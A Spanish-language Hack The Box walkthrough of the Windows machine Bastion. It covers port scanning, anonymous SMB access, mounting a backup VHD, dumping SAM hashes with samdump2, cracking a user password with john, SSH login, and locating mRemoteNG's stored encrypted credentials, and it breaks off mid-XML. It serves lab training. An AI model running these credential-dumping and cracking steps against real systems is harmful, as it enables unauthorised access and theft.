---
title: Hack The Box Bastion
author: k4miyo
date: 2022-03-18
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Windows]
tags: [Powershell, File Misconfiguration]
ping: true
---

## Bastion
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.134.

```bash
❯ ping -c 1 10.10.10.134
PING 10.10.10.134 (10.10.10.134) 56(84) bytes of data.
64 bytes from 10.10.10.134: icmp_seq=1 ttl=127 time=137 ms

--- 10.10.10.134 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.525/136.525/136.525/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.134 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 16:24 CST
Initiating SYN Stealth Scan at 16:24
Scanning 10.10.10.134 [65535 ports]
Discovered open port 139/tcp on 10.10.10.134
Discovered open port 135/tcp on 10.10.10.134
Discovered open port 445/tcp on 10.10.10.134
Discovered open port 22/tcp on 10.10.10.134
Discovered open port 49667/tcp on 10.10.10.134
Discovered open port 49670/tcp on 10.10.10.134
Discovered open port 47001/tcp on 10.10.10.134
Discovered open port 49668/tcp on 10.10.10.134
Discovered open port 49669/tcp on 10.10.10.134
Discovered open port 49664/tcp on 10.10.10.134
Discovered open port 5985/tcp on 10.10.10.134
Discovered open port 49666/tcp on 10.10.10.134
Discovered open port 49665/tcp on 10.10.10.134
Completed SYN Stealth Scan at 16:24, 14.21s elapsed (65535 total ports)
Nmap scan report for 10.10.10.134
Host is up, received user-set (0.13s latency).
Scanned at 2022-03-18 16:24:07 CST for 14s
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.31 seconds
           Raw packets sent: 69080 (3.040MB) | Rcvd: 68945 (2.758MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 179 B
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.134
   5   │     [*] Open ports: 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 10.10.10.134 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 16:25 CST
Nmap scan report for 10.10.10.134                                                                                                
Host is up (0.13s latency).
                                                                
PORT      STATE SERVICE      VERSION                           
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:                                                  
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)                                                                  
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)   
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0       
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0       
|_http-title: Not Found                                         
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC                                                                               
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-18T22:26:13
|_  start_date: 2022-03-18T22:22:59
|_clock-skew: mean: -20m00s, deviation: 34m35s, median: -2s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-18T23:26:15+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.59 seconds
```

Vemos el puerto 445 abierto, por lo tanto vamos a tratar de conectarnos a través de una ***Null Session***:

```bash
❯ smbclient -L 10.10.10.134 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
❯ smbmap -H 10.10.10.134 -u 'null'
[+] Guest session       IP: 10.10.10.134:445    Name: 10.10.10.134                                      
[/] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\ZETQPDWRLG, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

Vemos que podemos acceder al recurso `Backups` y tenemos permisos de lectura y escritura; por lo tanto vamos ingresar a dicho recurso.

```bash
❯ smbclient //10.10.10.134/Backups -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 18 21:18:35 2022
  ..                                  D        0  Fri Mar 18 21:18:35 2022
  note.txt                           AR      116  Tue Apr 16 05:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 06:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 06:44:02 2019
  ZETQPDWRLG                          D        0  Fri Mar 18 21:18:35 2022

                5638911 blocks of size 4096. 1179128 blocks available

smb: \>
```

Para trabajar más cómodos, vamos a crearnos una montura del recurso `backups` en nuestra máquina.

```bash
❯ mkdir /mnt/smbmounted
❯ mount -t cifs //10.10.10.134/backups /mnt/smbmounted/ -o username=null,password=null,domain=WORKGROUP,rw
❯ cd /mnt/smbmounted
❯ tree
.
├── note.txt
├── SDT65CB.tmp
├── WindowsImageBackup
│   └── L4mpje-PC
│       ├── Backup 2019-02-22 124351
│       │   ├── 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
│       │   ├── 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
│       │   ├── BackupSpecs.xml
│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
│       │   └── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
│       ├── Catalog
│       │   ├── BackupGlobalCatalog
│       │   └── GlobalCatalog
│       ├── MediaId
│       └── SPPMetadataCache
│           └── {cd113385-65ff-4ea2-8ced-5630f6feca8f}
└── ZETQPDWRLG

6 directories, 19 files
```

Vamos a descargarnos a nuestra máquina el archivo `note.txt` por si existe una pista que nos ayude.

```bash
❯ cp /mnt/smbmounted/note.txt .
❯ cat note.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: note.txt
       │ Size: 116 B
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
   3   │ 
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

La nota nos indica que no descarguemos el backup debido a que la VPN va lenta. Esta pista nos indica que igual y no deberíamos descargar los archivos de extensión `.vhd` que se encuentran bajo la ruta `WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351`;  ya que hay uno que pesa 5.0 GB.

```bash
❯ ls -l /mnt/smbmounted/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351
.rwxr-xr-x root root  36 MB Fri Feb 22 06:44:03 2019  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
.rwxr-xr-x root root 5.0 GB Fri Feb 22 06:45:32 2019  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
.rwxr-xr-x root root 1.2 KB Fri Feb 22 06:45:32 2019  BackupSpecs.xml
.rwxr-xr-x root root 1.1 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
.rwxr-xr-x root root 8.7 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
.rwxr-xr-x root root 6.4 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
.rwxr-xr-x root root 2.8 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
.rwxr-xr-x root root 1.5 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
.rwxr-xr-x root root 1.4 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
.rwxr-xr-x root root 3.8 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
.rwxr-xr-x root root 3.9 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
.rwxr-xr-x root root 6.9 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
.rwxr-xr-x root root 2.3 MB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
```

Por lo tanto, vamos a instalarnos la herramienta `qemu-utils`:

```bash
❯ apt-get install qemu-utils -y
```

Ahora, nos situamos en la ruta `/mnt/smbmounted/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351` y cargamos un módulo de kernel:

```bash
❯ cd /mnt/smbmounted/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351
❯ rmmod nbd
rmmod: ERROR: Module nbd is not currently loaded
```

Vemos que es necesario cargar el módulo **nbd**, por lo que ejecutamos lo siguiente:

```bash
❯ modprobe nbd max_part=16
❯ ls -l /dev | grep nbd
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd0
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd1
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd10
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd11
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd12
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd13
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd14
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd15
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd2
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd3
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd4
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd5
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd6
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd7
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd8
brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd9
❯ rmmod nbd
```

Ahora si ya nos acepta el comando y luego ejecutamos lo siguiente:

```bash
❯ qemu-nbd -c /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
qemu-nbd: Failed to open /dev/nbd0: No such file or directory
qemu-nbd: Disconnect client, due to: Failed to read request: Unexpected end-of-file before all bytes were read
```

En caso de que nos salga este error, volvemos a ejecutar `modprobe nbd max_part=16` y otra vez `qemu-nbd -c /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd` en donde el archivo `vhd` (***Virtual Hard Disk***) corresponde al más grande, es decir, el que pesa 5.0 GB:

```bash
❯ modprobe nbd max_part=16
❯ qemu-nbd -c /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
```

Ahora vamos a crearnos una montura del disco que lo tenemos en  `/dev/nbd0`:

```bash
❯ mkdir /mnt/Bastion
❯ mount /dev/nbd0p1 /mnt/Bastion
```

Debemos de tener el disco virtual montado bajo `/mnt/Bastion`, vamos a comprobarlo:

```bash
❯ cd /mnt/Bastion
❯ ll
drwxrwxrwx root root   0 B  Fri Feb 22 06:39:26 2019  $Recycle.Bin
lrwxrwxrwx root root  18 B  Mon Jul 13 23:53:55 2009  Documents and Settings ⇒ /mnt/Bastion/Users
drwxrwxrwx root root   0 B  Mon Jul 13 21:37:05 2009  PerfLogs
drwxrwxrwx root root 4.0 KB Mon Apr 11 21:21:18 2011  Program Files
drwxrwxrwx root root 4.0 KB Mon Jul 13 23:53:55 2009  ProgramData
drwxrwxrwx root root   0 B  Fri Feb 22 06:39:17 2019  Recovery
drwxrwxrwx root root 4.0 KB Fri Feb 22 06:43:53 2019  System Volume Information
drwxrwxrwx root root 4.0 KB Fri Feb 22 06:39:21 2019  Users
drwxrwxrwx root root  16 KB Fri Feb 22 06:40:48 2019  Windows
.rwxrwxrwx root root  24 B  Wed Jun 10 16:42:20 2009  autoexec.bat
.rwxrwxrwx root root  10 B  Wed Jun 10 16:42:20 2009  config.sys
.rwxrwxrwx root root 2.0 GB Fri Feb 22 06:38:21 2019  pagefile.sys
```

Tenemos una estructura de directorios de Windows; así que vamos a dirigirnos a la ruta `Windows/System32/config`:

```bash
❯ cd Windows/System32/config
❯ ll
drwxrwxrwx root root   0 B  Mon Jul 13 21:04:23 2009  Journal
drwxrwxrwx root root   0 B  Fri Feb 22 06:37:28 2019  RegBack
drwxrwxrwx root root 4.0 KB Sat Nov 20 14:48:09 2010  systemprofile
drwxrwxrwx root root 4.0 KB Fri Feb 22 06:38:05 2019  TxR
.rwxrwxrwx root root  28 KB Fri Feb 22 15:37:05 2019  BCD-Template
.rwxrwxrwx root root  25 KB Fri Feb 22 15:37:05 2019  BCD-Template.LOG
.rwxrwxrwx root root  30 MB Fri Feb 22 06:43:54 2019  COMPONENTS
.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:54 2011  COMPONENTS.LOG
.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  COMPONENTS.LOG1
.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  COMPONENTS.LOG2
.rwxrwxrwx root root 1.0 MB Fri Feb 22 06:38:46 2019  COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.0.regtrans-ms
.rwxrwxrwx root root 1.0 MB Fri Feb 22 06:38:46 2019  COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.1.regtrans-ms
.rwxrwxrwx root root 1.0 MB Fri Feb 22 06:38:46 2019  COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.2.regtrans-ms
.rwxrwxrwx root root  64 KB Fri Feb 22 06:38:46 2019  COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.blf
.rwxrwxrwx root root  64 KB Fri Feb 22 06:38:21 2019  COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TM.blf
.rwxrwxrwx root root 512 KB Fri Feb 22 06:38:21 2019  COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms
.rwxrwxrwx root root 512 KB Mon Jul 13 23:46:45 2009  COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms
.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  DEFAULT
.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  DEFAULT.LOG
.rwxrwxrwx root root  89 KB Fri Feb 22 06:43:54 2019  DEFAULT.LOG1
.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  DEFAULT.LOG2
.rwxrwxrwx root root 256 KB Fri Feb 22 06:39:21 2019  SAM
.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  SAM.LOG
.rwxrwxrwx root root  21 KB Fri Feb 22 06:39:21 2019  SAM.LOG1
.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SAM.LOG2
.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  SECURITY
.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  SECURITY.LOG
.rwxrwxrwx root root  21 KB Fri Feb 22 06:43:54 2019  SECURITY.LOG1
.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SECURITY.LOG2
.rwxrwxrwx root root  23 MB Fri Feb 22 06:43:54 2019  SOFTWARE
.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:54 2011  SOFTWARE.LOG
.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  SOFTWARE.LOG1
.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SOFTWARE.LOG2
.rwxrwxrwx root root 9.3 MB Fri Feb 22 06:43:54 2019  SYSTEM
.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  SYSTEM.LOG
.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  SYSTEM.LOG1
.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SYSTEM.LOG2
```

Dentro podemos encontrar los archivos `SAM` y `SYSTEM`; que en conjunto podemos obtener los hashes de los usarios a nivel de sistema. Por lo tanto, haremos uso de la herramienta `samdump2`:

```bash
❯ samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

Como ya tenemos hashes de los usuarios, vamos a tratar de romperlos con `john`:

```bash
❯ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (*disabled* Administrator)
bureaulampje     (L4mpje)
2g 0:00:00:00 DONE (2022-03-18 22:12) 3.076g/s 14454Kp/s 14454Kc/s 14462KC/s burg772v..burdy1
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

Tenemos la contraseña del usuario **L4mpje** y como siempre, vamos a guardarlas para no olvidarlas despúes. Si recordamos, tenemos el puerto 22 abierto, por lo tanto vamos a tratar de conectarnos.

```bash
❯ ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password:
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

l4mpje@BASTION C:\Users\L4mpje>whoami                                                                                           
bastion\l4mpje                                                                                                                  

l4mpje@BASTION C:\Users\L4mpje>
```

Ya ingresamos a la máquina y podemos visualizar la flag (user.txt). Ahora vamos a enumerar un poco el sistema para ver la forma de escalar privilegios.

```bash
l4mpje@BASTION C:\Users\L4mpje\Desktop>whoami /priv                                                                             

PRIVILEGES INFORMATION                                                                                                          
----------------------                                                                                                          

Privilege Name                Description                    State                                                              
============================= ============================== =======                                                            
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                            
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled                                                            

l4mpje@BASTION C:\Users\L4mpje\Desktop>
l4mpje@BASTION C:\Users\L4mpje\Desktop>cd C:\                                                                                   

l4mpje@BASTION C:\>dir                                                                                                          
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 1B7D-E692                                                                                              

 Directory of C:\                                                                                                               

19-03-2022  04:18    <DIR>          Backups                                                                                     
12-09-2016  12:35    <DIR>          Logs                                                                                        
22-02-2019  14:42    <DIR>          PerfLogs                                                                                    
31-01-2022  17:39    <DIR>          Program Files                                                                               
22-02-2019  14:01    <DIR>          Program Files (x86)                                                                         
22-02-2019  13:50    <DIR>          Users                                                                                       
31-01-2022  17:52    <DIR>          Windows                                                                                     
               0 File(s)              0 bytes                                                                                   
               7 Dir(s)   4.798.181.376 bytes free                                                                              

l4mpje@BASTION C:\>cd PROGRA~1                                                                                                  

l4mpje@BASTION C:\PROGRA~1>dir                                                                                                  
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 1B7D-E692                                                                                              

 Directory of C:\PROGRA~1                                                                                                       

31-01-2022  17:39    <DIR>          .                                                                                           
31-01-2022  17:39    <DIR>          ..                                                                                          
16-04-2019  11:18    <DIR>          Common Files                                                                                
23-02-2019  09:38    <DIR>          Internet Explorer                                                                           
22-02-2019  14:19    <DIR>          OpenSSH-Win64                                                                               
22-02-2019  14:08    <DIR>          PackageManagement                                                                           
31-01-2022  17:39    <DIR>          VMware                                                                                      
23-02-2019  10:22    <DIR>          Windows Defender                                                                            
23-02-2019  09:38    <DIR>          Windows Mail                                                                                
23-02-2019  10:22    <DIR>          Windows Media Player                                                                        
16-07-2016  14:23    <DIR>          Windows Multimedia Platform                                                                 
16-07-2016  14:23    <DIR>          Windows NT                                                                                  
23-02-2019  10:22    <DIR>          Windows Photo Viewer                                                                        
16-07-2016  14:23    <DIR>          Windows Portable Devices                                                                    
22-02-2019  14:08    <DIR>          WindowsPowerShell                                                                           
               0 File(s)              0 bytes                                                                                   
              15 Dir(s)   4.798.181.376 bytes free                                                                              

l4mpje@BASTION C:\PROGRA~1>cd ..                                                                                                

l4mpje@BASTION C:\>cd PROGRA~2                                                                                                  

l4mpje@BASTION C:\PROGRA~2>dir                                                                                                  
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 1B7D-E692                                                                                              

 Directory of C:\PROGRA~2                                                                                                       

22-02-2019  14:01    <DIR>          .                                                                                           
22-02-2019  14:01    <DIR>          ..                                                                                          
16-07-2016  14:23    <DIR>          Common Files                                                                                
23-02-2019  09:38    <DIR>          Internet Explorer                                                                           
16-07-2016  14:23    <DIR>          Microsoft.NET                                                                               
22-02-2019  14:01    <DIR>          mRemoteNG                                                                                   
23-02-2019  10:22    <DIR>          Windows Defender                                                                            
23-02-2019  09:38    <DIR>          Windows Mail                                                                                
23-02-2019  10:22    <DIR>          Windows Media Player                                                                        
16-07-2016  14:23    <DIR>          Windows Multimedia Platform                                                                 
16-07-2016  14:23    <DIR>          Windows NT                                                                                  
23-02-2019  10:22    <DIR>          Windows Photo Viewer                                                                        
16-07-2016  14:23    <DIR>          Windows Portable Devices                                                                    
16-07-2016  14:23    <DIR>          WindowsPowerShell                                                                           
               0 File(s)              0 bytes                                                                                   
              14 Dir(s)   4.798.181.376 bytes free                                                                              

l4mpje@BASTION C:\PROGRA~2>
```

Ya vemos algo que nos llama la atención y es el programa **mRemoteNG** y resulta que dicho programa contiene credenciales las cuales se pueden descifrar; por lo tanto nos vamos a la ruta del archivo de configuración:

```bash
l4mpje@BASTION C:\PROGRA~2>cd %HOME%/AppData/Roaming/mRemoteNG                                                                  

l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir                                                                    
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 1B7D-E692                                                                                              

 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                                                         

22-02-2019  14:03    <DIR>          .                                                                                           
22-02-2019  14:03    <DIR>          ..                                                                                          
22-02-2019  14:03             6.316 confCons.xml                                                                                
22-02-2019  14:02             6.194 confCons.xml.20190222-1402277353.backup                                                     
22-02-2019  14:02             6.206 confCons.xml.20190222-1402339071.backup                                                     
22-02-2019  14:02             6.218 confCons.xml.20190222-1402379227.backup                                                     
22-02-2019  14:02             6.231 confCons.xml.20190222-1403070644.backup                                                     
22-02-2019  14:03             6.319 confCons.xml.20190222-1403100488.backup                                                     
22-02-2019  14:03             6.318 confCons.xml.20190222-1403220026.backup                                                     
22-02-2019  14:03             6.315 confCons.xml.20190222-1403261268.backup                                                     
22-02-2019  14:03             6.316 confCons.xml.20190222-1403272831.backup                                                     
22-02-2019  14:03             6.315 confCons.xml.20190222-1403433299.backup                                                     
22-02-2019  14:03             6.316 confCons.xml.20190222-1403486580.backup                                                     
22-02-2019  14:03                51 extApps.xml                                                                                 
22-02-2019  14:03             5.217 mRemoteNG.log                                                                               
22-02-2019  14:03             2.245 pnlLayout.xml                                                                               
22-02-2019  14:01    <DIR>          Themes                                                                                      
              14 File(s)         76.577 bytes                                                                                   
               3 Dir(s)   4.798.181.376 bytes free                                                                              

l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>
```

El archivo que nos interesa es `confCons.xml`, por lo tanto le echamos un ojo:

```bash
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml                                                       
<?xml version="1.0" encoding="utf-8"?>                                                                                           
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GC 
M" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0 
oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                                                                                       
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna 
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" 
 Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rend 
eringEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeo 
ut="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" Disp 
layThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" R 
edirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" Redire 
